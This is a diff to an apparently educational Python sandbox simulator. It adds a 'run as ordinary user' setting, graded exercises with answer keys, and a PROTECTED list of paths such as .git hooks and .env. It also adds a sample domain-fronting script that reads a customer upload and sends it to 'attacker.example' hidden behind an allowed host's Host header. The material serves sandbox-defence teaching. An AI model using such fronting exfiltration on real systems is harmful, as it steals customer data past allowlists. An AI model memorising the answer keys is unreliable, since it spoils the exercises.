@@ -30,14 +30,15 @@ ATTACKER = "attacker.example"
 # what the machine itself has: a limit at or above this is no limit (an hour is forever for a two second job)
 HOST_CAP = {"seconds": 3600, "memory_mb": 16000, "pids": 30000, "disk_mb": 100000}
 
-# ---------------------------------------------------------------- the box: nine settings, one per wall
+# ---------------------------------------------------------------- the box: ten settings, one per wall
 # mounts:  host folder -> "ro" or "rw"; {"/": "rw"} is the whole disk.   network: "open", "off", "firewall" (an allowlist of
 # addresses; the box still looks names up itself) or "proxy" (the only way out; the box has no resolver).   allow: host names.
 # env: "inherit" (the app's variables, key included) or "empty".   inject: the proxy adds Koda's key outside the box.
 # limits: {"seconds", "memory_mb", "pids", "disk_mb"} or None.   fresh: a new box for every session.
 # wall: "none", "os", "container", "gvisor" or "microvm".   collect: "follow" (copy whatever is in the output folder) or "files".
+# user: "root", or "plain" (an ordinary user, with its extra privileges dropped and the box's system folders read-only).
 NO_BOX = {"mounts": {"/": "rw"}, "network": "open", "allow": (), "env": "inherit", "inject": False,
-          "limits": None, "fresh": False, "wall": "none", "collect": "follow"}
+          "limits": None, "fresh": False, "wall": "none", "user": "root", "collect": "follow"}
 NETWORKS = ("open", "off", "firewall", "proxy")
 WALL_IDS = ("none", "os", "container", "gvisor", "microvm")
 SHARED_KERNEL = {"none", "os", "container"}      # these walls leave the code talking to the host's own kernel
@@ -81,6 +82,8 @@ def box_error(box):
         return "limits is None or a dict of numbers with the keys " + ", ".join(HOST_CAP)
     if b["wall"] not in WALL_IDS:
         return "wall is one of: " + ", ".join(WALL_IDS)
+    if b["user"] not in ("root", "plain"):
+        return 'user is "root" or "plain"'
     if b["collect"] not in ("follow", "files"):
         return 'collect is "follow" or "files"'
     return None
@@ -166,6 +169,18 @@ def _step(e, b, loot):
             return f"reached {host}" + ("" if host in KODA_HOSTS else " with nothing to send"), True, None
         harm = f"sent to {host}: " + _and(loot)
         return harm, True, harm
+    if op == "front":                                    # an allowed name on the connection, another site in the request inside it
+        host, inner = e["host"], e["inner"]
+        if net == "off":
+            return "refused: no network in the box", False, None
+        if net in ("firewall", "proxy") and host not in b["allow"]:
+            return f"refused: {host} is not on the allowlist", False, None
+        if b["inject"] and net == "proxy":               # a proxy that opens each request to add the key sees which site it is for
+            return f"refused: the proxy opened the request, and {inner} is not on the allowlist", False, None
+        if not loot:
+            return f"reached {inner} behind {host}, with nothing to send", True, None
+        harm = f"sent to {inner} behind {host}: " + _and(loot)
+        return harm, True, harm
     if op == "dns":
         if net == "off":
             return "refused: no network in the box", False, None
@@ -190,6 +205,13 @@ def _step(e, b, loot):
             harm = "reached the host's kernel: the one every customer on this machine shares"
             return harm, True, harm
         return "reached the box's own kernel, not the host's: an escape now needs a second bug", False, None
+    if op == "rootbug":
+        if b["user"] != "root":
+            return "refused: the bug needs root inside the box, and the code runs as an ordinary user", False, None
+        if b["wall"] in SHARED_KERNEL:
+            harm = "root on the host: the bug turned root inside the box into root outside it"
+            return harm, True, harm
+        return "root inside the box's own kernel only: reaching the host needs a second bug", False, None
     if op == "link":
         if access(b, e["path"]) != "rw":
             return "refused: the box cannot write there", False, None
@@ -350,6 +372,18 @@ urllib.request.urlopen(req)''',
         {"op": "connect", "host": "api.koda.example", "auth": "attacker", "line": "urllib.request.urlopen(req)", "bad": True},
     ],
 }
+EXFIL_FRONT = {
+    "id": "exfil_front", "title": "an allowed name on the outside, another site inside",
+    "code": '''import urllib.request
+upload = open("/work/in/sales.csv", "rb").read()
+# the connection is opened to the allowed name; the Host header inside it asks for another site behind the same front
+req = urllib.request.Request("https://api.koda.example/drop", data=upload, headers={"Host": "attacker.example"})
+urllib.request.urlopen(req)''',
+    "effects": [
+        {"op": "read", "path": _UPLOAD, "line": 'open("/work/in/sales.csv", "rb")', "loot": "this customer's upload"},
+        {"op": "front", "host": "api.koda.example", "inner": ATTACKER, "line": "urllib.request.urlopen(req)", "bad": True},
+    ],
+}
 DOCKER = {
     "id": "docker", "title": "talk to the Docker daemon",
     "code": '''import socket
@@ -378,7 +412,15 @@ KERNEL = {
 trigger_kernel_bug()''',
     "effects": [{"op": "kernel", "line": "trigger_kernel_bug()", "bad": True}],
 }
-SCRIPTS = [JOB, JOB_API, EXFIL, WIPE, SPIN, HOG, FORK, FILL, EXFIL_DNS, EXFIL_ALLOWED, DOCKER, PLANT, LINK, KERNEL]
+ROOTBUG = {
+    "id": "rootbug", "title": "a stand-in for a bug only root can use (no exploit code here)",
+    "code": '''# a stand-in: assume one unfixed bug in the program that starts containers,
+# usable only by code that is root inside the box. This line stands for using it.
+use_runtime_bug_as_root()''',
+    "effects": [{"op": "rootbug", "line": "use_runtime_bug_as_root()", "bad": True}],
+}
+SCRIPTS = [JOB, JOB_API, EXFIL, WIPE, SPIN, HOG, FORK, FILL, EXFIL_DNS, EXFIL_ALLOWED, EXFIL_FRONT, DOCKER, PLANT, LINK, KERNEL,
+           ROOTBUG]
 
 
 def story(box):
@@ -486,7 +528,8 @@ def filter_table():
 MAX_AGE = 900                    # seconds a session may keep its box
 MAX_BYTES = 1_000_000            # the largest result file the app copies out
 MAX_FILES = 3                    # and how many of them
-EXERCISE_NS = {"MAX_AGE": MAX_AGE, "MAX_BYTES": MAX_BYTES, "MAX_FILES": MAX_FILES}
+PROTECTED = (".git", ".github", ".vscode", ".codex", ".claude", ".env", ".mcp.json")   # names a tool outside the box runs or reads
+EXERCISE_NS = {"MAX_AGE": MAX_AGE, "MAX_BYTES": MAX_BYTES, "MAX_FILES": MAX_FILES, "PROTECTED": PROTECTED}
 
 STARTERS = {
     "leak": '''# GOAL: return the secret the app holds, with code the word filter lets through.
@@ -519,6 +562,24 @@ def pick_box(session, boxes, now):
 # RETURN: the list of names to copy, in order.
 def collect(entries):
     return ...''',
+    "pick_wall": '''# GOAL: which wall does this deployment need?
+# INPUTS: d, a dict such as {"machine": "server", "customers": 40, "vms": True}.
+#         machine is "laptop" or "server"; customers is how many different customers' code runs on this machine;
+#         vms says whether the machine can start virtual machines (that needs hardware virtualisation).
+# RULES:  more than one customer on the machine needs a wall with its own kernel: "microvm" where the machine can start
+#         virtual machines, otherwise "gvisor". One customer: "os" on a laptop, "container" on a server.
+# RETURN: "os", "container", "gvisor" or "microvm".
+def pick_wall(d):
+    return ...''',
+    "may_write": '''# GOAL: a coding agent's box has to write into the project folder. Which paths may it never write?
+# PROVIDED: PROTECTED, the names a tool outside the box runs or reads by itself:
+#           (".git", ".github", ".vscode", ".codex", ".claude", ".env", ".mcp.json")
+# INPUTS: path, a path inside the project, such as "src/report.py" or "packages/api/.git/config".
+# RULES:  refuse the write when any part of the path, folder or file, is a name in PROTECTED.
+#         Compare in lower case: on macOS and Windows .GIT and .git are the same folder.
+# RETURN: True to allow the write, False to refuse it.
+def may_write(path):
+    return ...''',
 }
 
 ANSWERS = {
@@ -539,6 +600,13 @@ ANSWERS = {
     "collect": '''def collect(entries):
     keep = [e["name"] for e in entries if e["kind"] == "file" and e["size"] <= MAX_BYTES]   # filter first
     return keep[:MAX_FILES]                             # then cap''',
+    "pick_wall": '''def pick_wall(d):
+    if d["customers"] > 1:                              # strangers share the machine: the box needs a kernel of its own
+        return "microvm" if d["vms"] else "gvisor"      # a microVM needs hardware virtualisation; gVisor does not
+    return "os" if d["machine"] == "laptop" else "container"   # one customer: the lightest wall that fits''',
+    "may_write": '''def may_write(path):
+    parts = path.lower().split("/")                     # every folder on the way, and the file itself
+    return not any(part in PROTECTED for part in parts)   # an exact match on a part, not a search in the text''',
 }
 # the two settings exercises start from "no box" and end at these
 MOUNTS_START = '''# Which host folders does the box see, and how?  "ro" = read-only, "rw" = read and write.
@@ -560,6 +628,7 @@ BOX_START = '''my_box = {
     "limits": None,             # {"seconds": .., "memory_mb": .., "pids": .., "disk_mb": ..}
     "fresh": False,             # a new box for every session
     "wall": "none",             # "none", "os", "container", "gvisor" or "microvm"
+    "user": "root",             # "root" or "plain" (an ordinary user, privileges dropped)
     "collect": "follow",        # "follow" or "files"
 }'''
 BOX_ANSWER = '''my_box = {
@@ -571,6 +640,7 @@ BOX_ANSWER = '''my_box = {
     "limits": {"seconds": 30, "memory_mb": 512, "pids": 64, "disk_mb": 200},
     "fresh": True,
     "wall": "microvm",
+    "user": "plain",
     "collect": "files",
 }'''
 
@@ -600,6 +670,10 @@ def _box(bid, session, started):
 
 def _entry(name, kind="file", size=120):
     return {"name": name, "kind": kind, "size": size}
+
+
+def _site(machine, customers, vms):
+    return {"machine": machine, "customers": customers, "vms": vms}
 
 
 _FIVE = [_entry(n) for n in ("a.txt", "b.txt", "c.txt", "d.txt", "e.txt")]
@@ -643,6 +717,28 @@ EXERCISE_CASES = {
         ("a link, then three files", ([_entry("x.txt", "link", 9)] + _FIVE[:3],), _eq(["a.txt", "b.txt", "c.txt"]),
          "trap: filter first, then count"),
         ("a file of exactly MAX_BYTES", ([_entry("big.csv", size=MAX_BYTES)],), _eq(["big.csv"]), "at most MAX_BYTES: copied"),
+    ],
+    "pick_wall": [
+        ("a developer's laptop, their own code", (_site("laptop", 1, True),), _eq("os"), "one user, their own machine: an OS sandbox"),
+        ("a server that runs one customer's code", (_site("server", 1, True),), _eq("container"),
+         "trap: it could start a microVM; nobody else is on the machine, so the lightest wall that fits is enough"),
+        ("a server shared by 40 customers", (_site("server", 40, True),), _eq("microvm"), "strangers share it: a kernel of its own"),
+        ("the same 40 customers, on a machine that cannot start virtual machines", (_site("server", 40, False),), _eq("gvisor"),
+         "trap: no virtual machines is not a reason to fall back to a container"),
+        ("a server shared by 2 customers", (_site("server", 2, True),), _eq("microvm"), "trap: two is already sharing"),
+        ("one customer, on a machine that cannot start virtual machines", (_site("server", 1, False),), _eq("container"),
+         "one customer: a container"),
+    ],
+    "may_write": [
+        ("src/report.py", ("src/report.py",), _eq(True), "ordinary project code: allowed"),
+        (".git/hooks/pre-commit", (".git/hooks/pre-commit",), _eq(False), "git runs this file before each commit, outside the box"),
+        (".git/config", (".git/config",), _eq(False), "git's settings can name a program for git to run"),
+        ("packages/api/.git/config", ("packages/api/.git/config",), _eq(False),
+         "trap: a repository inside the project has hooks and settings too"),
+        (".GIT/config", (".GIT/config",), _eq(False), "trap: on macOS and Windows .GIT and .git are the same folder"),
+        (".github/workflows/ci.yml", (".github/workflows/ci.yml",), _eq(False), "this runs later on the build server, with its secrets"),
+        ("services/api/.env", ("services/api/.env",), _eq(False), "trap: a protected name can be a file, and can sit in any folder"),
+        (".gitignore", (".gitignore",), _eq(True), "trap: it only starts like .git; match each part of the path exactly"),
     ],
 }
 
@@ -741,6 +837,11 @@ BOX_CHECKS = [
      "Two sessions still share a box. Give every session a new one."),
     ("one kernel bug does not reach the host", lambda b: not run(KERNEL, b)["harm"],
      "The code still talks to the host's own kernel. Choose a wall that gives the box a kernel of its own."),
+    ("a request cannot hide another site inside an allowed connection", lambda b: not run(EXFIL_FRONT, b)["harm"],
+     "A request to the allowed name can still carry another site's name inside it. Only a proxy that opens each request "
+     "sees that, and the proxy opens requests when it adds the key: use the proxy, with inject on."),
+    ("the code does not run as root inside the box", lambda b: full(b)["user"] == "plain",
+     "The code still runs as root inside the box. Run it as an ordinary user, with its privileges dropped."),
 ]
 
 
@@ -765,10 +866,15 @@ TERMS = [
     ("egress", "traffic leaving the box"),
     ("allowlist", "the short list of places the box may reach; everything else is refused"),
     ("proxy", "a program outside the box that every outgoing request must pass through"),
+    ("DNS lookup", "asking a name server which address a host name stands for"),
     ("environment variable", "a named value a program inherits when it starts; API keys often live there"),
     ("kernel", "the core of the operating system: every program asks it for files, network and memory"),
+    ("system call", "one request from a program to the kernel, such as: open this file"),
+    ("container", "a process the host's kernel shows only its own files, processes and network"),
     ("microVM", "a small virtual machine with its own kernel"),
     ("escape", "code getting out of the box and onto the machine that runs it"),
+    ("symlink", "a file that is only a pointer to another path"),
+    ("hook", "a file a tool runs by itself at a set moment, such as before each commit"),
 ]
 
 EXERCISE_LIST = [
@@ -806,12 +912,17 @@ EXERCISE_LIST = [
     {"num": "6.7.1", "title": "Predict what a container shares", "minutes": 2,
      "goal": "A container gives code its own files, process list and network. Guess what it still shares with every other container on the machine.",
      "passes": "you have guessed."},
+    {"num": "6.7.2", "title": "Choose the wall", "minutes": 4,
+     "goal": "Write pick_wall(): which wall a deployment needs, by who shares the machine and what the machine can run.",
+     "passes": "every row passes."},
     {"num": "6.8.1", "title": "Collect the results", "minutes": 4,
      "goal": "Write collect(): which entries in the output folder the app copies out of the box.", "passes": "every row passes."},
     {"num": "6.8.2", "title": "Predict where the hook runs", "minutes": 1,
      "goal": "Code in the box writes a git hook into the project folder. Guess where that hook runs.", "passes": "you have guessed."},
+    {"num": "6.8.3", "title": "Protect the files that run later", "minutes": 4,
+     "goal": "Write may_write(): which paths in a project folder a coding agent's box may never write.", "passes": "every row passes."},
     {"num": "6.9.1", "title": "Build the box", "minutes": 6,
-     "goal": "Set all nine settings so the analysis runs and every attack in this module stops.", "passes": "all twelve checks pass."},
+     "goal": "Set all ten settings so the analysis runs and every attack in this module stops.", "passes": "all fourteen checks pass."},
 ]
 for _i, _e in enumerate(EXERCISE_LIST, 1):
     _e["n"] = _i
@@ -823,13 +934,13 @@ if __name__ == "__main__":
     for s in SCRIPTS:
         for e in s["effects"]:
             assert e["line"] in s["code"], (s["id"], e["line"])
-    assert len({s["id"] for s in SCRIPTS}) == len(SCRIPTS) == 14
+    assert len({s["id"] for s in SCRIPTS}) == len(SCRIPTS) == 16
 
     # the settings
     assert box_error(NO_BOX) is None and box_error({}) is None
     for bad in ("x", {"mount": {}}, {"mounts": {"work": "rw"}}, {"mounts": {"/work": "r"}}, {"network": "on"},
                 {"allow": "api.koda.example"}, {"env": "none"}, {"inject": 1}, {"limits": {"cpu": 1}},
-                {"limits": {"seconds": "30"}}, {"wall": "vm"}, {"collect": "all"}):
+                {"limits": {"seconds": "30"}}, {"wall": "vm"}, {"user": "nobody"}, {"collect": "all"}):
         assert isinstance(box_error(bad), str), bad
     nested = {"mounts": {"/work": "ro", "/work/out": "rw"}}
     assert access(nested, "/work/in/sales.csv") == "ro" and access(nested, "/work/out/summary.txt") == "rw"
@@ -843,6 +954,8 @@ if __name__ == "__main__":
     for s in RUNAWAYS:
         assert run(s, NO_BOX)["harm"] == [USE_HARM[s["effects"][0]["what"]]], s["id"]
     assert run(DOCKER, NO_BOX)["harm"] and run(KERNEL, NO_BOX)["harm"] and story(NO_BOX)["harm"]
+    assert run(ROOTBUG, NO_BOX)["harm"] and run(EXFIL_FRONT, NO_BOX)["harm"] == [
+        "sent to attacker.example behind api.koda.example: this customer's upload"]
     out = run(LINK, NO_BOX)
     assert out["harm"] == ["returned to the user: the database password"] and [r[2] for r in out["rows"]] == [None, False]
     for s in (JOB, JOB_API):
@@ -857,24 +970,27 @@ if __name__ == "__main__":
     assert not run(JOB, {"mounts": {"/work/in": "ro"}})["done"]
     assert run(EXFIL, files)["harm"] == ["sent to attacker.example: the API key and this customer's upload"]   # files alone do not hold data in
 
-    # Part 4, the network wall: (EXFIL, EXFIL_DNS, EXFIL_ALLOWED still leak), and does the API call still work
+    # Part 4, the network wall: (EXFIL, EXFIL_DNS, EXFIL_ALLOWED, EXFIL_FRONT still leak), and does the API call still work
     part4 = {**files, "allow": ["api.koda.example"]}
 
     def leaks(net, **more):
         b = {**part4, "network": net, **more}
-        return [bool(run(s, b)["harm"]) for s in (EXFIL, EXFIL_DNS, EXFIL_ALLOWED)], run(JOB_API, b)["done"]
+        return [bool(run(s, b)["harm"]) for s in (EXFIL, EXFIL_DNS, EXFIL_ALLOWED, EXFIL_FRONT)], run(JOB_API, b)["done"]
 
-    assert leaks("open") == ([True, True, True], True)
-    assert leaks("off") == ([False, False, False], False)
-    assert leaks("firewall") == ([False, True, True], True)
-    assert leaks("proxy") == ([False, False, True], True)
+    assert leaks("open") == ([True, True, True, True], True)
+    assert leaks("off") == ([False, False, False, False], False)
+    assert leaks("firewall") == ([False, True, True, True], True)
+    assert leaks("proxy") == ([False, False, True, True], True)
+    assert not run(EXFIL_FRONT, {**files, "network": "proxy", "allow": []})["harm"]       # the outside name must be allowed first
 
     # Part 5, secrets: an empty environment takes the key away, and the proxy puts it on the request outside the box
     part5 = {**part4, "env": "empty"}
     assert run(EXFIL, {**part5, "network": "open"})["harm"] == ["sent to attacker.example: this customer's upload"]
     assert not run(JOB_API, {**part5, "network": "proxy"})["done"]                        # no key in the box, and nobody adds one
     assert not run(JOB_API, {**part5, "network": "firewall", "inject": True})["done"]     # a firewall cannot add a header
-    assert leaks("proxy", env="empty", inject=True) == ([False, False, False], True)
+    assert leaks("proxy", env="empty", inject=True) == ([False, False, False, False], True)
+    assert leaks("firewall", env="empty", inject=True)[0][3] is True                      # a firewall never opens a request
+    assert "the proxy opened the request" in summary(EXFIL_FRONT, {**part5, "network": "proxy", "inject": True})[1]
 
     # Part 6, limits and lifetime
     limits = {"seconds": 30, "memory_mb": 512, "pids": 64, "disk_mb": 200}
@@ -891,6 +1007,10 @@ if __name__ == "__main__":
     # Part 7, the wall, and Part 8, what crosses it
     assert [bool(run(KERNEL, {"wall": w})["harm"]) for w in WALL_IDS] == [True, True, True, False, False]
     assert [w["id"] for w in WALLS] == list(WALL_IDS)
+    assert [bool(run(ROOTBUG, {"wall": w})["harm"]) for w in WALL_IDS] == [True, True, True, False, False]
+    assert not any(run(ROOTBUG, {"wall": w, "user": "plain"})["harm"] for w in WALL_IDS)
+    assert run(ROOTBUG, {"wall": "container", "user": "plain"})["rows"][0][2] is True
+    assert run(KERNEL, {"wall": "container", "user": "plain"})["harm"]                    # an ordinary user still reaches the kernel
     out = run(LINK, {"collect": "files"})
     assert not out["harm"] and out["rows"][-1][2] is True and len(out["rows"]) == 2
     assert len(run(LINK, {"mounts": {"/work/in": "ro"}})["rows"]) == 1          # no link made, so nothing to collect
@@ -922,7 +1042,7 @@ if __name__ == "__main__":
     assert filter_syntax("import json\nprint(json.dumps(1))") is None and filter_syntax("x = eval('1')") == "eval()"
 
     # the graded exercises: starters are blank, answers pass, broken code fails closed
-    assert set(STARTERS) == set(ANSWERS) == set(EXERCISE_CASES) == {"leak", "outbound", "pick_box", "collect"}
+    assert set(STARTERS) == set(ANSWERS) == set(EXERCISE_CASES) == {"leak", "outbound", "pick_box", "collect", "pick_wall", "may_write"}
     graders = {name: (grade_leak if name == "leak" else (lambda code, n=name: grade(n, code))) for name in STARTERS}
     for name, g in graders.items():
         assert g(STARTERS[name])[1] == "blank", (name, g(STARTERS[name]))
@@ -963,6 +1083,19 @@ if __name__ == "__main__":
         ("collect", 'def collect(entries):\n    return [e["name"] for e in entries if e["kind"] == "file"][:MAX_FILES]', 1),
         ("collect", 'def collect(entries):\n    return [e["name"] for e in entries[:MAX_FILES] if e["kind"] == "file" and e["size"] <= MAX_BYTES]', 1),
         ("collect", 'def collect(entries):\n    return [e["name"] for e in entries if e["kind"] == "file" and e["size"] < MAX_BYTES][:MAX_FILES]', 1),
+        # pick_wall: ignores what the machine can run; three or more counts as sharing; a container whoever shares; a microVM wherever one starts
+        ("pick_wall", 'def pick_wall(d):\n    if d["customers"] > 1:\n        return "microvm"\n'
+                      '    return "os" if d["machine"] == "laptop" else "container"', 1),
+        ("pick_wall", 'def pick_wall(d):\n    if d["customers"] > 2:\n        return "microvm" if d["vms"] else "gvisor"\n'
+                      '    return "os" if d["machine"] == "laptop" else "container"', 1),
+        ("pick_wall", 'def pick_wall(d):\n    return "os" if d["machine"] == "laptop" else "container"', 3),
+        ("pick_wall", 'def pick_wall(d):\n    if d["vms"]:\n        return "microvm"\n    if d["customers"] > 1:\n        return "gvisor"\n'
+                      '    return "os" if d["machine"] == "laptop" else "container"', 2),
+        # may_write: only the start of the path; a search in the text; no lower case; only the first part
+        ("may_write", 'def may_write(path):\n    return not any(path == p or path.startswith(p + "/") for p in PROTECTED)', 3),
+        ("may_write", 'def may_write(path):\n    return not any(p in path.lower() for p in PROTECTED)', 1),
+        ("may_write", 'def may_write(path):\n    return not any(part in PROTECTED for part in path.split("/"))', 1),
+        ("may_write", 'def may_write(path):\n    return path.lower().split("/")[0] not in PROTECTED', 2),
     ):
         rows, state, _ = graders[name](code)
         bad = sum(1 for r in rows if r[2] is False)
@@ -981,6 +1114,10 @@ if __name__ == "__main__":
         ("collect", 'def collect(entries):\n    keep = []\n    for e in entries:\n'
                     '        if e["kind"] == "file" and e["size"] <= MAX_BYTES and len(keep) < MAX_FILES:\n'
                     '            keep.append(e["name"])\n    return keep'),
+        ("pick_wall", 'def pick_wall(d):\n    shared = d["customers"] >= 2\n    if shared and d["vms"]:\n        return "microvm"\n'
+                      '    if shared:\n        return "gvisor"\n    return {"laptop": "os", "server": "container"}[d["machine"]]'),
+        ("may_write", 'def may_write(path):\n    for part in path.split("/"):\n        if part.lower() in PROTECTED:\n'
+                      '            return False\n    return True'),
     ):
         assert graders[name](code)[1] == "pass", (name, code, graders[name](code))
 
@@ -995,7 +1132,7 @@ if __name__ == "__main__":
     assert failing(check_mounts, 'my_mounts = {"/work": "ro", "/work/out": "rw"}') == []
     assert failing(check_mounts, 'my_mounts = {"/work/in": "ro"}') == ["the analysis can write its summary"]
     results, hint = check_box(BOX_START)
-    assert [ok for _, ok in results].count(True) == 2 and hint == BOX_CHECKS[2][2] and len(BOX_CHECKS) == 12
+    assert [ok for _, ok in results].count(True) == 2 and hint == BOX_CHECKS[2][2] and len(BOX_CHECKS) == 14
     assert check_box(BOX_ANSWER) == ([(label, True) for label, _, _ in BOX_CHECKS], "")
     names = [label for label, _, _ in BOX_CHECKS]
     for change, broken in (                                     # one setting short of the answer fails the checks that setting buys
@@ -1003,8 +1140,9 @@ if __name__ == "__main__":
         ('my_box["wall"] = "gvisor"', []),
         ('my_box["collect"] = "follow"', [9]),
         ('my_box["fresh"] = False', [10]),
-        ('my_box["inject"] = False', [1, 5]),
-        ('my_box["network"] = "firewall"', [1, 4, 5]),
+        ('my_box["user"] = "root"', [13]),
+        ('my_box["inject"] = False', [1, 5, 12]),
+        ('my_box["network"] = "firewall"', [1, 4, 5, 12]),
         ('my_box["network"] = "off"', [1]),
         ('my_box["allow"] = []', [1]),
         ('my_box["env"] = "inherit"', [2]),
@@ -1025,7 +1163,7 @@ if __name__ == "__main__":
         else:
             raise AssertionError(("should have been refused", code))
 
-    assert [e["n"] for e in EXERCISE_LIST] == list(range(1, len(EXERCISE_LIST) + 1)) and len(EXERCISE_LIST) == 16
-    assert sum(e["minutes"] for e in EXERCISE_LIST) == 45
+    assert [e["n"] for e in EXERCISE_LIST] == list(range(1, len(EXERCISE_LIST) + 1)) and len(EXERCISE_LIST) == 18
+    assert sum(e["minutes"] for e in EXERCISE_LIST) == 53
     assert sys.gettrace() is None
     print("koda_sandbox: all checks passed")
